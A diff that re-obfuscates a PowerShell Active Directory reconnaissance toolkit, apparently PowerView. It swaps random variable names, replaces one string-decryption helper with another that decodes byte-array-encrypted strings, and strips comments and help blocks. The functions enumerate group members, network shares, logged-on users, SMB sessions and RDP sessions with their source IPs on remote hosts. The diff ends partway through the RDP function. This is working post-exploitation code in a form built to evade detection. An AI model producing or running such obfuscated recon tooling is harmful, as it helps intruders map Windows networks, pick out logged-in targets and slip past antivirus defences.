-            $WWfKB1U += Get-NameField -Object $ComputerName
+            $DvIb += Get-NameField -Object $ComputerName
         }
-
-        # query the specified group using the WINNT provider, and
-        # extract fields as appropriate from the results
-        ForEach($BCqCw1p in $WWfKB1U) {
+        ForEach($aXOOQM in $DvIb) {
             try {
                 if($ListGroups) {
-                    # if we're listing the group names on a remote server
-                    $fa0ya = [ADSI]((HandleResult95 @(0,130,91,171,243,58,225,1,146,222,110,141) @(86,176,55,222,167)) + $BCqCw1p + (HandleResult95 @(234,111,227,71,196,112,239,0,194,111,251,72) @(166,40,173,49)))
-
-                    $fa0ya.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
-                        $ayFBYTwN = New-Object PSObject
-                        $ayFBYTwN | Add-Member Noteproperty 'Server' $BCqCw1p
-                        $ayFBYTwN | Add-Member Noteproperty 'Group' ($_.name[0])
-                        $ayFBYTwN | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
-                        $ayFBYTwN | Add-Member Noteproperty 'Description' ($_.Description[0])
-                        $ayFBYTwN
+                    $mnZ6k = [ADSI]((ParseEntry20 @(87,194,117,53,81,116,52,4,77,137,33,125) @(1,240,25,64,5,24,101,50)) + $aXOOQM + (ParseEntry20 @(168,147,38,97,8,20,166,229,12,80,60,53) @(228,212,104,23,106,76)))
+                    $mnZ6k.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
+                        $tDwvKLfV = New-Object PSObject
+                        $tDwvKLfV | Add-Member Noteproperty 'Server' $aXOOQM
+                        $tDwvKLfV | Add-Member Noteproperty 'Group' ($_.name[0])
+                        $tDwvKLfV | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
+                        $tDwvKLfV | Add-Member Noteproperty 'Description' ($_.Description[0])
+                        $tDwvKLfV
                     }
                 }
                 else {
-                    # otherwise we're listing the group members
-                    $zRQl = @($([ADSI]((HandleResult95 @(80,85,122,56,20,203,100,108,74,30,46,112) @(6,103,22,77,64,167,53,90)) + $BCqCw1p + "/" + $GroupName)).psbase.Invoke('Members'))
-
-                    $zRQl | ForEach-Object {
-
-                        $fh1Y = New-Object PSObject
-                        $fh1Y | Add-Member Noteproperty 'Server' $BCqCw1p
-
+                    $IdJ9 = @($([ADSI]((ParseEntry20 @(10,27,22,116,26,223,162,216,16,80,66,60) @(92,41,122,1,78,179,243,238)) + $aXOOQM + "/" + $GroupName)).psbase.Invoke('Members'))
+                    $IdJ9 | ForEach-Object {
+                        $c7DK4cS = New-Object PSObject
+                        $c7DK4cS | Add-Member Noteproperty 'Server' $aXOOQM
                         $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')
-
-                        # try to translate the NT4 domain to a FQDN if possible
                         $Name = Convert-NT4toCanonical -ObjectName $AdsPath
                         if($Name) {
-                            $aiRYU = $Name.split("/")[0]
-                            $hMCTY = $AdsPath.split("/")[-1]
-                            $Name = ($aiRYU + "/" + $hMCTY)
-                            $oBx8r = $True
+                            $IqXysl = $Name.split("/")[0]
+                            $NzV7aZ1l = $AdsPath.split("/")[-1]
+                            $Name = ($IqXysl + "/" + $NzV7aZ1l)
+                            $GzBotu = $True
                         }
                         else {
                             $Name = $AdsPath
-                            $oBx8r = $False
+                            $GzBotu = $False
                         }
-
-                        $fh1Y | Add-Member Noteproperty 'AccountName' $Name
-
-                        # translate the binary sid to a string
-                        $fh1Y | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)
-
-                        # if the account is local, check if it's disabled, if it's domain, always print $False
-                        #   TODO: fix this occasinal error?
-                        $fh1Y | Add-Member Noteproperty 'Disabled' $( if(-not $oBx8r) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )
-
-                        # check if the member is a group
-                        $tHuZe6n = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
-                        $fh1Y | Add-Member Noteproperty 'IsGroup' $tHuZe6n
-                        $fh1Y | Add-Member Noteproperty 'IsDomain' $oBx8r
-                        if($tHuZe6n) {
-                            $fh1Y | Add-Member Noteproperty 'LastLogin' ""
+                        $c7DK4cS | Add-Member Noteproperty 'AccountName' $Name
+                        $c7DK4cS | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)
+                        $c7DK4cS | Add-Member Noteproperty 'Disabled' $( if(-not $GzBotu) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )
+                        $GOwA = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
+                        $c7DK4cS | Add-Member Noteproperty 'IsGroup' $GOwA
+                        $c7DK4cS | Add-Member Noteproperty 'IsDomain' $GzBotu
+                        if($GOwA) {
+                            $c7DK4cS | Add-Member Noteproperty 'LastLogin' ""
                         }
                         else {
                             try {
-                                $fh1Y | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
+                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                             }
                             catch {
-                                $fh1Y | Add-Member Noteproperty 'LastLogin' ""
+                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ""
                             }
                         }
-                        $fh1Y
-
-                        # if the result is a group domain object and we're recursing,
-                        # try to resolve all the group member results
-                        if($Recurse -and $oBx8r -and $tHuZe6n) {
-
-                            $aiRYU = $Name.split("/")[0]
+                        $c7DK4cS
+                        if($Recurse -and $GzBotu -and $GOwA) {
+                            $IqXysl = $Name.split("/")[0]
                             $GroupName = $Name.split("/")[1].trim()
-
-                            Get-NetGroupMember -GroupName $GroupName -Domain $aiRYU -FullData -Recurse | ForEach-Object {
-
-                                $fh1Y = New-Object PSObject
-                                $fh1Y | Add-Member Noteproperty 'Server' ($aiRYU + "/" + $($_.GroupName))
-
-                                $wKM7 = $_.distinguishedName
-                                # extract the FQDN from the Distinguished Name
-                                $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(88,134,94,62) @(10,195,19,7,65,97)))) -replace 'DC=','' -replace ',','.'
-
-                                if ($_.samAccountType -ne (HandleResult95 @(173,101,193,20,231,152,96,178,104,208,187,21) @(226,33,128,37,170))) {
-                                    $x5xlh = $True
+                            Get-NetGroupMember -GroupName $GroupName -Domain $IqXysl -FullData -Recurse | ForEach-Object {
+                                $c7DK4cS = New-Object PSObject
+                                $c7DK4cS | Add-Member Noteproperty 'Server' ($IqXysl + "/" + $($_.GroupName))
+                                $EybC7 = $_.distinguishedName
+                                $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(101,241,141,175) @(55,180,192,150,205,249,14,198)))) -replace 'DC=','' -replace ',','.'
+                                if ($_.samAccountType -ne (ParseEntry20 @(109,162,38,97,59,192,99,212,42,42,47,142) @(34,230,103,80,118,186))) {
+                                    $uOt2b = $True
                                 }
                                 else {
-                                    $x5xlh = $False
+                                    $uOt2b = $False
                                 }
-
                                 if ($_.samAccountName) {
-                                    # forest users have the samAccountName set
-                                    $oIRTSkE = $_.samAccountName
+                                    $s15G = $_.samAccountName
                                 }
                                 else {
                                     try {
-                                        # external trust users have a SID, so convert it
                                         try {
-                                            $oIRTSkE = Convert-SidToName $_.cn
+                                            $s15G = Convert-SidToName $_.cn
                                         }
                                         catch {
-                                            # if there's a problem contacting the domain to resolve the SID
-                                            $oIRTSkE = $_.cn
+                                            $s15G = $_.cn
                                         }
                                     }
                                     catch {
-                                        Write-Debug ((HandleResult95 @(225,74,103,255,127,128,91,74,229,112,229,104,79,180,101,129,115,122,179,115,250,84,99,204,79,240,83,27,207,92,142,47) @(179,18,45,134,29)) + $_)
+                                        Write-Debug ((ParseEntry20 @(254,155,176,179,77,159,138,157,169,66,250,185,152,248,87,158,162,173,255,65,229,133,180,128,125,239,130,204,131,110,145,254) @(172,195,250,202,47)) + $_)
                                     }
                                 }
-
-                                $fh1Y | Add-Member Noteproperty 'AccountName' ($LFju8kS + "/" + $oIRTSkE)
-                                $fh1Y | Add-Member Noteproperty 'SID' $_.objectsid
-                                $fh1Y | Add-Member Noteproperty 'Disabled' $False
-                                $fh1Y | Add-Member Noteproperty 'IsGroup' $x5xlh
-                                $fh1Y | Add-Member Noteproperty 'IsDomain' $True
-                                $fh1Y | Add-Member Noteproperty 'LastLogin' ''
-                                $fh1Y
+                                $c7DK4cS | Add-Member Noteproperty 'AccountName' ($YLe0 + "/" + $s15G)
+                                $c7DK4cS | Add-Member Noteproperty 'SID' $_.objectsid
+                                $c7DK4cS | Add-Member Noteproperty 'Disabled' $False
+                                $c7DK4cS | Add-Member Noteproperty 'IsGroup' $uOt2b
+                                $c7DK4cS | Add-Member Noteproperty 'IsDomain' $True
+                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ''
+                                $c7DK4cS
                             }
                         }
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(100,201,174,36,122,245,190,57,80,221,209,57,124,217,169,125) @(51,176,232,64)) + $_)
+                Write-Warning ((ParseEntry20 @(125,98,42,74,193,232,227,83,120,1,23,241,226,220,107,38) @(42,27,108,46,136,173,181)) + $_)
             }
         }
     }
 }
-
-
 function Get-NetShare {
-<#
-    .SYNOPSIS
-
-        This function will execute the NetShareEnum Win32API call to query
-        a given host for open shares. This is a replacement for
-        "net share \\hostname"
-
-    .PARAMETER ComputerName
-
-        The hostname to query for shares. Also accepts IP addresses.
-
-    .OUTPUTS
-
-        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
-        result structure which includes the name and note for each share.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetShare
-
-        Returns active shares on the local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetShare -ComputerName sqlserver
-
-        Returns active shares on the 'sqlserver' host
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
@@ -6477,57 +3248,35 @@ function Get-NetShare {
         [String]
         $ComputerName = 'localhost'
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
     }
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # arguments for NetShareEnum
-        $t8I3fsSF = 1
-        $AZZX = [IntPtr]::Zero
-        $gc7Fx = 0
-        $NPMa = 0
-        $uSWVRSW = 0
-
-        # get the share information
-        $e9hz = $pyQHtec7::NetShareEnum($ComputerName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)
-
-        # Locate the offset of the initial intPtr
-        $Offset = $AZZX.ToInt64()
-
-        Write-Debug ((HandleResult95 @(100,77,33,217,122,42,66,133,82,57,57,134,111,39,61,133,127,55,61,133,85,76,33,154,82,59,24,142) @(54,127,119,233)) + $e9hz)
-
-        # 0 = success
-        if (($e9hz -eq 0) -and ($Offset -gt 0)) {
-
-            # Work out how mutch to increment the pointer by finding out the size of the structure
-            $RRXu = $SWAZiW::GetSize()
-
-            # parse all the result structures
-            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
-                # create a new int ptr at the given offset and cast
-                #   the pointer as our result structure
-                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
-                $vPFl = $frhLlHV -as $SWAZiW
-                # return all the sections of the structure
-                $vPFl | Select-Object *
-                $Offset = $frhLlHV.ToInt64()
-                $Offset += $RRXu
+        $Nxku93 = 1
+        $kAB9 = [IntPtr]::Zero
+        $oPmA = 0
+        $uE88OB = 0
+        $xZFkyJ0 = 0
+        $NW6jRjlY = $aJIaD::NetShareEnum($ComputerName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
+        $Offset = $kAB9.ToInt64()
+        Write-Debug ((ParseEntry20 @(143,146,209,66,145,245,178,30,185,230,201,29,132,248,205,30,148,232,205,30,190,147,209,1,185,228,232,21) @(221,160,135,114)) + $NW6jRjlY)
+        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
+            $dw2rvH = $uCBIau::GetSize()
+            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
+                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
+                $Lsy7 = $KMRG7si -as $uCBIau
+                $Lsy7 | Select-Object *
+                $Offset = $KMRG7si.ToInt64()
+                $Offset += $dw2rvH
             }
-
-            # free up the result buffer
-            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
+            $Null = $aJIaD::NetApiBufferFree($kAB9)
         }
         else
         {
-            switch ($e9hz) {
+            switch ($NW6jRjlY) {
                 (5)           {Write-Debug 'The user does not have access to the requested information.'}
                 (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                 (87)          {Write-Debug 'The specified parameter is not valid.'}
@@ -6541,41 +3290,7 @@ function Get-NetShare {
         }
     }
 }
-
-
 function Get-NetLoggedon {
-<#
-    .SYNOPSIS
-
-        This function will execute the NetWkstaUserEnum Win32API call to query
-        a given host for actively logged on users.
-
-    .PARAMETER ComputerName
-
-        The hostname to query for logged on users.
-
-    .OUTPUTS
-
-        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
-        result structure which includes the username and domain of logged on users.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLoggedon
-
-        Returns users actively logged onto the local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLoggedon -ComputerName sqlserver
-
-        Returns users actively logged onto the 'sqlserver' host.
-
-    .LINK
-
-        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
@@ -6583,59 +3298,35 @@ function Get-NetLoggedon {
         [String]
         $ComputerName = 'localhost'
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
     }
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # Declare the reference variables
-        $t8I3fsSF = 1
-        $AZZX = [IntPtr]::Zero
-        $gc7Fx = 0
-        $NPMa = 0
-        $uSWVRSW = 0
-
-        # get logged on user information
-        $e9hz = $pyQHtec7::NetWkstaUserEnum($ComputerName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)
-
-        # Locate the offset of the initial intPtr
-        $Offset = $AZZX.ToInt64()
-
-        Write-Debug ((HandleResult95 @(167,101,187,159,185,2,216,195,145,18,149,217,175,101,137,195,175,16,212,218,188,31,167,195,150,100,187,220,145,19,130,200) @(245,87,237,175)) + $e9hz)
-
-        # 0 = success
-        if (($e9hz -eq 0) -and ($Offset -gt 0)) {
-
-            # Work out how mutch to increment the pointer by finding out the size of the structure
-            $RRXu = $JjX6hJWr::GetSize()
-
-            # parse all the result structures
-            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
-                # create a new int ptr at the given offset and cast
-                #   the pointer as our result structure
-                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
-                $vPFl = $frhLlHV -as $JjX6hJWr
-
-                # return all the sections of the structure
-                $vPFl | Select-Object *
-                $Offset = $frhLlHV.ToInt64()
-                $Offset += $RRXu
-
+        $Nxku93 = 1
+        $kAB9 = [IntPtr]::Zero
+        $oPmA = 0
+        $uE88OB = 0
+        $xZFkyJ0 = 0
+        $NW6jRjlY = $aJIaD::NetWkstaUserEnum($ComputerName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
+        $Offset = $kAB9.ToInt64()
+        Write-Debug ((ParseEntry20 @(224,107,13,116,6,187,135,53,63,1,50,152,232,107,63,40,16,169,139,44,18,12,0,130,209,106,13,55,46,170,221,62) @(178,89,91,68,74,238)) + $NW6jRjlY)
+        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
+            $dw2rvH = $lsABVkT::GetSize()
+            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
+                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
+                $Lsy7 = $KMRG7si -as $lsABVkT
+                $Lsy7 | Select-Object *
+                $Offset = $KMRG7si.ToInt64()
+                $Offset += $dw2rvH
             }
-
-            # free up the result buffer
-            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
+            $Null = $aJIaD::NetApiBufferFree($kAB9)
         }
         else
         {
-            switch ($e9hz) {
+            switch ($NW6jRjlY) {
                 (5)           {Write-Debug 'The user does not have access to the requested information.'}
                 (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                 (87)          {Write-Debug 'The specified parameter is not valid.'}
@@ -6649,109 +3340,45 @@ function Get-NetLoggedon {
         }
     }
 }
-
-
 function Get-NetSession {
-<#
-    .SYNOPSIS
-
-        This function will execute the NetSessionEnum Win32API call to query
-        a given host for active sessions on the host.
-        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)
-
-    .PARAMETER ComputerName
-
-        The ComputerName to query for active sessions.
-
-    .PARAMETER UserName
-
-        The user name to filter for active sessions.
-
-    .OUTPUTS
-
-        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
-        result structure which includes the host and username associated
-        with active sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetSession
-
-        Returns active sessions on the local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetSession -ComputerName sqlserver
-
-        Returns active sessions on the 'sqlserver' host.
-
-    .LINK
-
-        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [Alias('HostName')]
         [String]
         $ComputerName = 'localhost',
-
         [String]
         $UserName = ''
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
     }
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # arguments for NetSessionEnum
-        $t8I3fsSF = 10
-        $AZZX = [IntPtr]::Zero
-        $gc7Fx = 0
-        $NPMa = 0
-        $uSWVRSW = 0
-
-        # get session information
-        $e9hz = $pyQHtec7::NetSessionEnum($ComputerName, '', $UserName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)
-
-        # Locate the offset of the initial intPtr
-        $Offset = $AZZX.ToInt64()
-
-        Write-Debug ((HandleResult95 @(21,119,181,248,82,141,114,13,35,3,173,164,125,235,9,17,37,119,215,175,125,181,17,27,35,18,155,248,81,177,6,92) @(71,69,227,200,30,216,71,97)) + $e9hz)
-
-        # 0 = success
-        if (($e9hz -eq 0) -and ($Offset -gt 0)) {
-
-            # Work out how mutch to increment the pointer by finding out the size of the structure
-            $RRXu = $LdmYxDq::GetSize()
-
-            # parse all the result structures
-            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
-                # create a new int ptr at the given offset and cast
-                # the pointer as our result structure
-                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
-                $vPFl = $frhLlHV -as $LdmYxDq
-
-                # return all the sections of the structure
-                $vPFl | Select-Object *
-                $Offset = $frhLlHV.ToInt64()
-                $Offset += $RRXu
-
+        $Nxku93 = 10
+        $kAB9 = [IntPtr]::Zero
+        $oPmA = 0
+        $uE88OB = 0
+        $xZFkyJ0 = 0
+        $NW6jRjlY = $aJIaD::NetSessionEnum($ComputerName, '', $UserName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
+        $Offset = $kAB9.ToInt64()
+        Write-Debug ((ParseEntry20 @(181,203,165,139,171,172,198,215,131,191,189,215,132,202,189,203,133,203,199,220,132,148,165,193,131,174,139,139,168,144,178,134) @(231,249,243,187)) + $NW6jRjlY)
+        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
+            $dw2rvH = $BOJuX::GetSize()
+            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
+                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
+                $Lsy7 = $KMRG7si -as $BOJuX
+                $Lsy7 | Select-Object *
+                $Offset = $KMRG7si.ToInt64()
+                $Offset += $dw2rvH
             }
-            # free up the result buffer
-            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
+            $Null = $aJIaD::NetApiBufferFree($kAB9)
         }
         else
         {
-            switch ($e9hz) {
+            switch ($NW6jRjlY) {
                 (5)           {Write-Debug 'The user does not have access to the requested information.'}
                 (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                 (87)          {Write-Debug 'The specified parameter is not valid.'}
@@ -6765,37 +3392,7 @@ function Get-NetSession {
         }
     }
 }
-
-
 function Get-NetRDPSession {
-<#
-    .SYNOPSIS
-
-        This function will execute the WTSEnumerateSessionsEx and 
-        WTSQuerySessionInformation Win32API calls to query a given
-        RDP remote service for active sessions and originating IPs.
-        This is a replacement for qwinsta.
-
-        Note: only members of the Administrators or Account Operators local group
-        can successfully execute this functionality on a remote target.
-
-    .PARAMETER ComputerName
-
-        The hostname to query for active RDP sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetRDPSession
-
-        Returns active RDP/terminal sessions on the local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetRDPSession -ComputerName "sqlserver"
-
-        Returns active RDP/terminal sessions on the 'sqlserver' host.
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
@@ -6803,151 +3400,72 @@ function Get-NetRDPSession {
         [String]
         $ComputerName = 'localhost'
     )
-    
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
     }
-
     process {
-
-        # process multiple host object types from the pipeline
         $ComputerName = Get-NameField -Object $ComputerName
-
-        # open up a handle to the Remote Desktop Session host
-        $qT9jK = $KBfbHiS::WTSOpenServerEx($ComputerName)
-
-        # if we get a non-zero handle back, everything was successful
-        if ($qT9jK -ne 0) {
-
-            Write-Debug ((HandleResult95 @(157,253,252,45,135,18,50,167,174,194,55,191,66,30,145,160,205,18,133,21,57,140,164,198,27,190,115,3,145,152,193,30) @(203,204,174,121,211,33,112)) + $qT9jK)
-
-            # arguments for WTSEnumerateSessionsEx
-            $I8LSIf = [IntPtr]::Zero
-            $Gew58 = 0
-            
-            # get information on all current sessions
-            $e9hz = $KBfbHiS::WTSEnumerateSessionsEx($qT9jK, [ref]1, 0, [ref]$I8LSIf, [ref]$Gew58)
-
-            # Locate the offset of the initial intPtr
-            $Offset = $I8LSIf.ToInt64()
-
-            Write-Debug ((HandleResult95 @(44,238,156,149,40,136,251,240,24,136,152,184,35,135,156,173,47,237,152,187,25,237,162,183,24,177,128,135,31,156,140,184,32,135,128,240,24,151,159,247,51,158,243,252) @(122,223,206,193)) + $e9hz)
-            Write-Debug ((HandleResult95 @(7,71,139,248,188,210,229,213,43,107,132,179) @(100,2,197,142,216,133,208,229)) + $Gew58)
-
-            if (($e9hz -ne 0) -and ($Offset -gt 0)) {
-
-                # Work out how mutch to increment the pointer by finding out the size of the structure
-                $RRXu = $iXPiA::GetSize()
-
-                # parse all the result structures
-                for ($kUfFVle = 0; ($kUfFVle -lt $Gew58); $kUfFVle++) {
-     
-                    # create a new int ptr at the given offset and cast
-                    #   the pointer as our result structure
-                    $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
-                    $vPFl = $frhLlHV -as $iXPiA
-
-                    $xtTSyNT = New-Object PSObject
-
-                    if ($vPFl.pHostName) {
-                        $xtTSyNT | Add-Member Noteproperty 'ComputerName' $vPFl.pHostName
+        $liv8 = $uSJ2gRK::WTSOpenServerEx($ComputerName)
+        if ($liv8 -ne 0) {
+            Write-Debug ((ParseEntry20 @(90,255,21,164,219,248,93,14,110,162,9,156,236,165,69,14,111,165,17,196,198,140,119,10,110,163,21,131,213,159,112,5) @(12,206,71,240,143,203,31,98)) + $liv8)
+            $pzGV = [IntPtr]::Zero
+            $QVKhRZ7 = 0
+            $NW6jRjlY = $uSJ2gRK::WTSEnumerateSessionsEx($liv8, [ref]1, 0, [ref]$pzGV, [ref]$QVKhRZ7)
+            $Offset = $pzGV.ToInt64()
+            Write-Debug ((ParseEntry20 @(241,45,41,209,181,213,76,22,197,75,45,252,190,218,43,75,242,46,45,255,132,176,21,81,197,114,53,195,130,193,59,94,253,68,53,180,133,202,40,17,238,93,70,184) @(167,28,123,133,231,130,121,39)) + $NW6jRjlY)
+            Write-Debug ((ParseEntry20 @(33,217,237,122,33,26,229,114,211,202,77,120) @(66,156,163,12,69,77,208)) + $QVKhRZ7)
+            if (($NW6jRjlY -ne 0) -and ($Offset -gt 0)) {
+                $dw2rvH = $EOgY::GetSize()
+                for ($h4S0 = 0; ($h4S0 -lt $QVKhRZ7); $h4S0++) {
+                    $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
+                    $Lsy7 = $KMRG7si -as $EOgY
+                    $j3wWX = New-Object PSObject
+                    if ($Lsy7.pHostName) {
+                        $j3wWX | Add-Member Noteproperty 'ComputerName' $Lsy7.pHostName
                     }
                     else {
-                        # if no hostname returned, use the specified hostname
-                        $xtTSyNT | Add-Member Noteproperty 'ComputerName' $ComputerName
+                        $j3wWX | Add-Member Noteproperty 'ComputerName' $ComputerName
                     }
-
-                    $xtTSyNT | Add-Member Noteproperty 'SessionName' $vPFl.pSessionName
-
-                    if ($(-not $vPFl.pDomainName) -or ($vPFl.pDomainName -eq '')) {
-                        # if a domain isn't returned just use the username
-                        $xtTSyNT | Add-Member Noteproperty 'UserName' ($($vPFl.pUserName))
+                    $j3wWX | Add-Member Noteproperty 'SessionName' $Lsy7.pSessionName
+                    if ($(-not $Lsy7.pDomainName) -or ($Lsy7.pDomainName -eq '')) {
+                        $j3wWX | Add-Member Noteproperty 'UserName' ($($Lsy7.pUserName))
                     }
                     else {
-                        $xtTSyNT | Add-Member Noteproperty 'UserName' ($($vPFl.pDomainName) + "\" + $($vPFl.pUserName))
+                        $j3wWX | Add-Member Noteproperty 'UserName' ($($Lsy7.pDomainName) + "\" + $($Lsy7.pUserName))
                     }
-
-                    $xtTSyNT | Add-Member Noteproperty 'ID' $vPFl.SessionID
-                    $xtTSyNT | Add-Member Noteproperty 'State' $vPFl.State
-
-                    $cg3KS6l = [IntPtr]::Zero
-                    $AacDCgi6 = 0
-
-                    # query for the source client IP with WTSQuerySessionInformation
-                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
-                    $sv3KwOR = $KBfbHiS::WTSQuerySessionInformation($qT9jK, $vPFl.SessionID, 14, [ref]$cg3KS6l, [ref]$AacDCgi6)
-
-                    $u7LJPhLs = $cg3KS6l.ToInt64()
-                    $azZXWT = New-Object System.Intptr -ArgumentList $u7LJPhLs
-                    $HnnHRoS1 = $azZXWT -as $GkoHs2
-
-                    $mts1 = $HnnHRoS1.Address       
-                    if($mts1[2] -ne 0) {
-                        $mts1 = [String]$mts1[2]+"."+[String]$mts1[3]+"."+[String]$mts1[4]+"."+[String]$mts1[5]
+                    $j3wWX | Add-Member Noteproperty 'ID' $Lsy7.SessionID
+                    $j3wWX | Add-Member Noteproperty 'State' $Lsy7.State
+                    $Gflvk4 = [IntPtr]::Zero
+                    $EiOxIl = 0
+                    $bBRCVO2 = $uSJ2gRK::WTSQuerySessionInformation($liv8, $Lsy7.SessionID, 14, [ref]$Gflvk4, [ref]$EiOxIl)
+                    $gZZQPd = $Gflvk4.ToInt64()
+                    $hYA6j2 = New-Object System.Intptr -ArgumentList $gZZQPd
+                    $Z5AHdX = $hYA6j2 -as $Ff07
+                    $i8PCr = $Z5AHdX.Address       
+                    if($i8PCr[2] -ne 0) {
+                        $i8PCr = [String]$i8PCr[2]+"."+[String]$i8PCr[3]+"."+[String]$i8PCr[4]+"."+[String]$i8PCr[5]
                     }
                     else {
-                        $mts1 = $Null
+                        $i8PCr = $Null
                     }
-
-                    $xtTSyNT | Add-Member Noteproperty 'SourceIP' $mts1
-                    $xtTSyNT
-
-                    # free up the memory buffer
-                    $Null = $KBfbHiS::WTSFreeMemory($cg3KS6l)
-
-                    $Offset += $RRXu
+                    $j3wWX | Add-Member Noteproperty 'SourceIP' $i8PCr
+                    $j3wWX
+                    $Null = $uSJ2gRK::WTSFreeMemory($Gflvk4)
+                    $Offset += $dw2rvH
                 }
-                # free up the memory result buffer
-                $Null = $KBfbHiS::WTSFreeMemoryEx(2, $I8LSIf, $Gew58)
+                $Null = $uSJ2gRK::WTSFreeMemoryEx(2, $pzGV, $QVKhRZ7)
             }
-            # Close off the service handle
-            $Null = $KBfbHiS::WTSCloseServer($qT9jK)
+            $Null = $uSJ2gRK::WTSCloseServer($liv8)
         }
         else {
-            # otherwise it failed - get the last error
-            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
-            $zgfuO = $jAC8b6ZC::GetLastError()
-            Write-Verbuse ((HandleResult95 @(33,227,106,218,60,64,157,12,199,65,153,33,74,162,52,153) @(117,164,44,160,88,5,203)) + $zgfuO)
+            $orwQ = $H7dxZ::GetLastError()
